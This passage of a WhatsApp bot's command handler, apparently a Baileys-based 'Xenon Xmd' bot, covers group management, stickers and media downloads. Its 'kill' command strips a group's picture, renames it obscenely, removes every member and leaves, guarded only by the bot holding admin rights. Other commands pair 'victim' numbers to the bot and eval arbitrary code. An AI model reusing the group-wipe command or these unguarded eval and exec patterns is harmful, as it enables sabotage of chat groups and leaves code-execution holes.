    month: new Intl.DateTimeFormat('en-US', { month: 'long' }).format(d),
    year: d.getFullYear(),
    day: daysOfWeek[d.getUTCDay()],
    time: `${d.getUTCHours()}:${d.getUTCMinutes()}:${d.getUTCSeconds()}`
  }
}

if (!m.isGroup) return reply("Cette commande est destinée aux groupes");

let info = await bot.groupMetadata(m.chat);
let ts = await convertTimestamp(info.creation);

try {
        pp = await bot.profilePictureUrl(chat, 'image');
      } catch {
    pp = 'https://i.postimg.cc/xTRMBxQ4/afgan.jpg';
      }

await bot.sendMessage(m.chat, { image: { url: pp }, 
          caption: `_Name_ : *${info.subject}*\n\n_ID_ : *${info.id}*\n\n_Group owner_ : ${'@'+info.owner.split('@')[0]} || 'No Creator'\n\n_Group created_ : *${ts.day}, ${ts.date} ${ts.month} ${ts.year}, ${ts.time}*\n\n_Participants_ : *${info.size}*\n_Members_ : *${info.participants.filter((p) => p.admin == null).length}*\n\n_Admins_ : *${Number(info.participants.length - info.participants.filter((p) => p.admin == null).length)}*\n\n_Who can send message_ : *${info.announce == true ? 'Admins' : 'Everyone'}*\n\n_Who can edit group info_ : *${info.restrict == true ? 'Admins' : 'Everyone'}*\n\n_Who can add participants_ : *${info.memberAddMode == true ? 'Everyone' : 'Admins'}*`
        }, {quoted: m })
}
	 break;

//==================================================//                             
                case 'approve': case 'approve-all': {
	if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.group)
if (!isBotAdmins) return m.reply("le bot doit être un idiot administrateur")

const responseList = await bot.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return m.reply("Aucune demande en attente détectée pour le moment !");

for (const participan of responseList) {
    const response = await bot.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "approve" // or "reject"
    );
    console.log(response);
}
m.reply("Xenon Xmd a approuvé toutes les demandes en attente✅");

}
 break;
//==================================================//      
case 'h':
case 'hidetag': {
if (!isGroup) return reply(mess.group)
if (!Owner) return reply(mess.owner)
if (m.quoted) {
bot.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
bot.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
}
break
//==================================================//        
        case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `𝐆𝐢𝐝𝐝𝐲 𝐓𝐞𝐧𝐧𝐨𝐫 ϟ`
  let NoOwn = `2250500107362`
  var contact = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION: JavaScript coder\nX-WA-BIZ-NAME:[[ ༑ 𝐖𝐢𝐬𝐞-𝐀𝐥 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: mdmodes
  })
  bot.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;
//==================================================//            
        case 'style': case 'fancy': {
if (!text) return reply('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += ` ${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break //==================================================//      
        case 'tagall': {
if (!isGroup) return reply(mess.group)
if (!Owner) return reply(mess.owner)
if (!text) return reply("woi")
bot.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await bot.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: text
}
]
}
}, {
quoted: m
})
}
break
//==================================================//              
        case  'getppgc':
if (!isGroup) return 
reply("process...")
try {
var ppimg = await bot.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i.postimg.cc/xTRMBxQ4/afgan.jpg'
}
await bot.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
break
//==================================================//      
        case "promote": case "promot": {
if (!isGroup) return m.reply(`for group only`)
if (!isAdmins && !Owner) return m.reply(`Commande réservée aux administrateurs de groupe uniquement`)
if (!isBotAdmins) return m.reply(`le bot n'est pas un idiot administrateur`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => m.reply(err.toString()))
} else return m.reply('Example: 225XXX/@tag')}
break  
//==================================================//              
        case "totalcase": {
penis = fs.readFileSync("./base.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n• ');

reply(`Cas total : ${totalCases}\n\n• ${totalCases > 0 ? listCases : "Aucun cas trouvé."}`);
}
break
//==================================================//              
        case 'delpp': {
if (!Owner) return reply(mess.owner);
bot.removeProfilePicture(bot.user.id)
reply("success")
}
break
//==================================================//               
        case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return reply(`Répondre à la vidéo/image avec légende ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await bot.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Durée maximale de la vidéo ? 10 s !')
let media = await quoted.download()
let encmedia = await bot.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return reply(`répondre photo/vidéo avec légende ${prefix + command}\nDurée de la vidéo 1 à 9 secondes`)
}
}
break
//==================================================//        
        case "demote": case "demote": {
if (!isGroup) return m.reply(mess.group)
if (!isAdmins && !Owner) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(`bot n'est pas un administrateur de ce groupe`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => m.reply(err.toString()))
} else return m.reply('example:225XX')}
break
//==================================================//           
 case "tourl": {
try {
 if (!/image|video|sticker|audio/.test(mime)) 
 return reply(`
*❌ Erreur de syntaxe !*
Envoyer/Répondre à la vidéo/image avec légende ${command}`);
 if (!m.quoted) 
 return reply(`
*❌ Erreur de syntaxe !*
Envoyer/Répondre à la vidéo/image avec légende ${command}`);
 await bot.sendMessage(m.chat, {
 react: { text: '📄', key: m.key }
 });
 let media = await m.quoted.download();
 if (!media) throw new Error("❌ Media download failed");
 const uploadImage = require('./list/lib/uploadImage.js');
 const uploadFile = require('./list/lib/uploadFile.js');
 let isImage = /video|sticker\/(webp)|audio|image\/(png|jpe?g|gif)/.test(mime);
 let link = await (isImage ? uploadImage : uploadFile)(media);
 if (!link) throw new Error("❌ Échec du téléchargement du média");
let msg = await generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: `✅ Succès Convertir en lien\nExpiré : Non défini\nAppuyez sur le bouton ci-dessous pour copier`,
},
footer: { text: "" },
header: {
title: `[ ! ] INFORMATION`,
subtitle: "",
hasMediaAttachment: false,
},
nativeFlowMessage: {
buttons: [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Link!",
copy_code: `${link}`,
}),
},
],
},
contextInfo: { mentionedJid: [m.sender] },
},
},
},
},
{ quoted: m }
);

await bot.relayMessage(msg.key.remoteJid, msg.message, {});
} catch (error) {
 console.error(error); // Log error di konsol untuk debugging
 reply(`❌ Une erreur s'est produite !\n\n${error.message || "Échec du traitement de la demande."}`);
}
break;
}
//==================================================//                
        case "tts": {
if (!text) return reply("example:Hallo")
if (text.length >= 300) return reply("maximum text must be 300!")
reply("process.....")
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
bot.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return reply(e.toString())
}
}
break
//==================================================//          
        case "setbio": case "setbiobot": {
if (!Owner) return m.reply(mess.owner)
if (!text) return m.reply('reply a rext')
bot.updateProfileStatus(text)
m.reply("Biographie mise à jour avec succès ✅")
}
break
//==================================================//            
        case 'toimage':
case 'toimg': {
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)

let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
bot.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
fs.unlinkSync(ran)
})

}
break
//==================================================//          
        case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) reply(`autocollant de réponse avec légende *${prefix + command}*`)
var media = await bot.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
bot.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convertir un autocollant en vidéo'}, { quoted: m })
await fs.unlinkSync(media)
}
break
//==================================================//          
        case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`tag/reply Video/Audio with Caption ${prefix + command}`)
let media = await bot.downloadMediaMessage(qmsg)
let audio = await toAudio(media, 'mp4')
bot.sendMessage(m.chat, {
audio: audio,
mimetype: 'audio/mpeg'
}, {
quoted: m
})
}
break
//==================================================//    
        
                 case "kill": {
	  if (!m.isGroup) return m.reply(mess.group)          
 if (!isBotAdmins) return m.reply(`le bot n'est pas administrateur du groupe`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != bot.decodeJid(bot.user.id)).map(_0x3c0c18 => _0x3c0c18.id);
		      
          m.reply("Initialisation de la commande Kill💀...");
      
      await bot.removeProfilePicture(m.chat);
      await bot.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await bot.groupUpdateDescription(m.chat, "//Ce groupe n'est plus disponible 🥹!");
      
	
          setTimeout(() => {
            bot.sendMessage(m.chat, {
              'text': "Tous les paramètres sont configurés et la commande Kill a été initialisée et confirmée✅️. Maintenant, tout " + raveni.length + " Les participants au groupe seront supprimés dans la seconde qui suit.\n\nAu revoir à tous 👋\n\nCE PROCESSUS EST IRRÉVERSIBLE ⚠️"
            }, {
              'quoted': m
            });
            setTimeout(() => {
              bot.groupParticipantsUpdate(m.chat, raveni, "remove");
              setTimeout(() => {
                m.reply("Tous les participants du groupe ont été supprimés avec succès✅️.\n\nAu revoir propriétaire du groupe 👋, il fait trop froid ici 🥶.");
bot.groupLeave(m.chat);	      
              }, 1000);
            }, 1000);
          }, 1000);
        };	      
          break; //==================================================//      
        case 'autorecordtype':

                if (!Owner) return reply(mess.owner)

                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)

                if (q === 'on') {

                    autorecordtype = true

                    reply(`L'enregistrement et la saisie automatiques ont été modifiés avec succès en ${q}`)

                } else if (q === 'off') {

                    autorecordtype = false

                    reply(`L'enregistrement et la saisie automatiques ont été modifiés avec succès en ${q}`)

                }

                break  
//==================================================//      
        case "getpp": {
if (q) {
try {
var ppWong = await bot.profilePictureUrl(q, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
bot.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await bot.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://telegra.ph/file/7cde96ce87ae7d9bd22a4.jpg"
}
bot.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
}
}
break
//==================================================//
        case 'autotype':
                if (!Owner) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    reply(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    reply(`Successfully changed auto-typing to ${q}`)
                }
                break
//==================================================//            
        case "listserver": {
if (global.apikey.length < 1) return reply("you don't have an apikey!")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("invalid request")
let messageText = "*List Servers *\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`🌧️ ID Server ${s.id}\`
* Server name : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await bot.sendMessage(m.chat, { text: messageText }, { quoted: loli })
}
break
//==================================================//             
        case "eval":{
   if (!Owner) return reply(mess.owner)
if (!text) return reply ('Provide a valid Bot Baileys Function to evaluate')
   try { 
 let evaled = await eval(budy.slice(2)); 
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled); 
 await reply(evaled); 
   } catch (err) { 
 await reply(String(err)); 
   } 
 } 
     break;
//==================================================//             
        case 'tiktokstalk':
case 'ttstalk': {
  if (!text) return reply(`Username? `)
let res = await fg.ttStalk(args[0])
let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
await bot.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
break
//==================================================//            
        case 'translate':{
  	if (!q) return reply(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       reply(result.text)
    } catch (e) {
        return m.reply(err)
    } 
    }
    break
//==================================================//     
        case 'play': {
  if (!text) return reply('provide a song title lagu!\nExample: *play ransoms*');

  try {
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API not found');
    let json = await res.json();
    if (!json.success || !json.result) throw new Error('an api error occured');
    const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;
    const thumbnail = await (await fetch(image)).buffer();
    await bot.sendMessage(m.chat, {
      audio: { url: download.audio },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title,
          body: `${author.name} • ${duration.timestamp}`,
          thumbnail,
          mediaUrl: url,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.warn('Fallback to Nekorinn API:', e.message);
    try {
      let res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
      let data = await res.json();
      if (!data.status || !data.result) throw new Error('Respon cadangan 1 tidak valid');
      const { title, channel, duration, imageUrl, link } = data.result.metadata;
      const downloadUrl = data.result.downloadUrl;
      const thumbnail = await (await fetch(imageUrl)).buffer();
      await bot.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        ptt: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title,
            body: `${channel} • ${duration}`,
            thumbnail,
            mediaUrl: link,
            mediaType: 2,
            renderLargerThumbnail: true,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    } catch (err) {
      console.warn('Fallback to Diioffc API:', err.message);
      try {
        const res2 = await fetch(`https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`);
        if (!res2.ok) return reply('unable to get song data.');
        const json = await res2.json();
        if (!json.status || !json.result) return reply('title must be valid!');
        const { title, author, duration, thumbnail: thumb, url, download } = json.result;
        const thumbnail = await (await fetch(thumb)).buffer();
        await bot.sendMessage(m.chat, {
          audio: { url: download.url },
          mimetype: 'audio/mpeg',
          fileName: download.filename || `${title}.mp3`,
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              title,
              body: `${author.name} • ${duration.timestamp}`,
              thumbnail,
              mediaUrl: url,
              mediaType: 2,
              renderLargerThumbnail: true,
              sourceUrl: url
            }
          }
        }, { quoted: m });
      } catch (finalErr) {
        console.error(finalErr);
        m.reply('an error has occurred while processing your request.');
      }
    }
  }
}
break
//==================================================//     
        case "song":{
                if (!text) return reply(`\n*ex:* ${prefix + command} impossible\n`)
                
               await reply(`processing your request`);
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                bot.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: loli })
            }
            break
//==================================================//           
        case 'join': { 
                 if (!Owner) return reply(mess.ownee)
                 if (!text) return reply("provide a valid group link") 
                 let result = args[0].split('https://chat.whatsapp.com/')[1] 
                 await bot.groupAcceptInvite(result).then((res) =>  reply(jsonformat(res))).catch((err) =>reply(`Link has problem.`)) 
  
             }  
               break;
        
//==================================================//              
        case "toimage": {
if (!/webp/.test(mime) && !/audio/.test(mime)) return reply('reply sticker')
reply('wait....')
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
bot.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
//==================================================//                 
        case 'listblock':{
let block = await bot.fetchBlocklist()
reply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Blocked Contacts' : '*' + block.length + '* Blocked Contacts'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//==================================================//             
        case 'pairban':
case 'pair': {
    const allowedUsers = ['2250500107362@s.whatsapp.net', '2250500107362@s.whatsapp.net']; // add your allowed WhatsApp IDs here
    if (!allowedUsers.includes(m.sender)) return reply("_Only authorized users can use this command._");

    if (!q) return reply(`Example:\n ${prefix + command} 225###`);

    let victim = text.split("|")[0];
    let Xreturn = m.mentionedJid?.[0] || m.quoted?.sender || victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const contactInfo = await bot.onWhatsApp(Xreturn);
    if (!contactInfo || contactInfo.length === 0) {
        return reply("The number is not registered on WhatsApp");
    }

    await reply("*processing.....*");

    const numberOnly = victim.replace(/[^0-9]/g, '');
    const countryCode = numberOnly.slice(0, 3);
    const prefixxx = numberOnly.slice(0, 1);
    const firstTwoDigits = numberOnly.slice(0, 2);

    const isValidWhatsAppNumber = (number) => {
        return number.length >= 10 && number.length <= 15 && !isNaN(number);
    };

    if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
        return reply("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
    }

    if (!isValidWhatsAppNumber(numberOnly)) {
        return reply("Invalid WhatsApp number. Please enter a valid number.");
    }

    const startpairing = require('./connect.js');
    await startpairing(Xreturn);
    await sleep(4000);

    const fs = require('fs');
    const cu = fs.readFileSync('./list/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    await sleep(2000);

    await bot.sendMessage(Xreturn, {
        image: { url: "https://i.postimg.cc/xTRMBxQ4/afgan.jpg" },
        caption: `━━━━━━━━━━━━\n* Success Pairing\n* ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤAl 🥳\n* Link that code\n* Welcome to the ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ Community \n━━━━━━━━━━━━`
    }, { quoted: m });

    await sleep(4500);

    await bot.sendMessage(Xreturn, {
        text: `${cuObj.code}`
    }, { quoted: m });

    break;
}
//==================================================//              
        case 'delpair': {

const allowedUsers = ['2250500107362@s.whatsapp.net', '2250500107362@s.whatsapp.net']; // By яαgємσ∂ѕ

    if (!allowedUsers.includes(m.sender)) return reply("❌ You don't have permission to use this command.");

    if (!q) return reply(`Example:\n ${prefix + command} 225...`);

    let victim = text.split("|")[0];
    let Xreturn = m.mentionedJid?.[0] || m.quoted?.sender || victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    if (!Xreturn) {
        return reply("The number is not registered on WhatsApp");
    }

    const pairingPath = './list/lib/pairing';
    const targetPath = `${pairingPath}/${Xreturn}`;

    try {
        if (!fs.existsSync(targetPath)) {
            return reply(`Paired device with ID "${Xreturn}" does not exist.`);
        }

        fs.rmSync(targetPath, { recursive: true, force: true });
        reply(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
    } catch (err) {
        console.error('Error deleting paired device:', err);
        return reply('An error occurred while attempting to delete the paired device.');
    }
}
break;
//==================================================//               
        case 'wise-paired': {


    const pairingPath = './lib2/pairing';

    try {
        if (!fs.existsSync(pairingPath)) {
            return reply('No paired devices found.');
        }

        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name.replace('@s.whatsapp.net', ''));

        if (pairedDevices.length === 0) {
            return reply('No paired devices found.');
        }

        const totalUsers = pairedDevices.length;
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        reply(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return reply('Failed to load paired devices data.');
    }
}
break;
//==================================================//              
        case 'clearchat': {
let pee = "\n".repeat(200)
reply(pee + '😁🖕')
}
break
//==================================================//            
        case "toptv": {
if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return reply("maximum video duration 30 seconds!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
bot.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return reply("reply to video")
}
}
break
//==================================================//      
        case 'tiktok': case "tt": { 
             
    if (!text) return m.reply(`Example : ${prefix + command} link`);
    if (!text.includes('tiktok')) return m.reply(`Link Invalid!!`);
    reply("Please Wait..");
    
    // Menggunakan fetch untuk akses API TikTok milikmu
    fetch(`https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(text)}`)
        .then(response => response.json())
        .then(data => {
            if (data.status !== 200) return m.reply('Api error');
            
            // Mengambil URL video dan audio
        const title = `*Successfully*`
            const videoUrl = data.result.play;
            const audioUrl = data.result.music;
            
            // Mengirim video dan audio
            bot.sendMessage(m.chat, { caption: title, video: { url: videoUrl }}, { quoted: m });
            bot.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' }, { quoted: null });
        })
        .catch(err => reply(err.toString()));
}
break;
//==================================================//           
        case "yts": {
if (!text) return reply("Example:Dj Tiktok")
await m.reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.reply(mess.error)
let teks = '\n*🔎Your Search*\n\n'
for (let i of data.all) {
teks += `*◦ Title :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Duration :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
reply(teks)
}).catch(err => m.reply(err.toString()))
}
break
//==================================================//           
        case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return m.reply("🔗 provide a fb or ig link!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("provide a valid link.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("media is invalid.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media invalid.");
 }
 } else {
 throw new Error("provide a valid url or link.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await bot.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return m.reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await bot.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Downloaded by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ!*" }, { quoted: m });
 } else if (res.type === "image") {
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await bot.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Downloaded photo by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await bot.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 m.reply("failed to get media.");
 }
}
break   
//==================================================//             
        case "setppbot": case "setpp": {
if (!Owner) return reply(mess.owner)
if (/image/g.test(mime)) {
let media = await bot.downloadAndSaveMediaMessage(qmsg)
await bot.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
reply("Success update bot pic ✅")
} else return reply("reply a photo")}
break
//==================================================//     
        case 'lyrics': {
  if (!q) return m.reply('Example: lyrics <keyword>,<amount>\n\nExample: lyrics duka,3')
  let [keyword, jumlah] = q.split(',').map(v => v.trim())
  if (!keyword) return m.reply('provide a valid key word')
  jumlah = parseInt(jumlah) || 3

  try {
    let res = await fetch(`https://apikey.sazxofficial.web.id/api/search/lyrics?q=${encodeURIComponent(keyword)}`)
    let data = await res.json()
    if (!data.status || !data.result || data.result.length === 0) {
      return m.reply('Lyrics not found.')
    }
    let hasil = data.result.slice(0, jumlah).map((item, i) => {
      return `*${i + 1}. ${item.title}* - _${item.artist}_\n\n${item.lyricSingkat.trim()}\n`
    }).join('\n────────────\n\n')
    m.reply(`*Downloaded Lyrics: ${keyword}*\n\n${hasil}`)
  } catch (e) {
    console.error(e)
    m.reply('an error has occurred while fetching lyrics.')
  }
}
  break
//==================================================//            
         case 'bass':
 try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//    
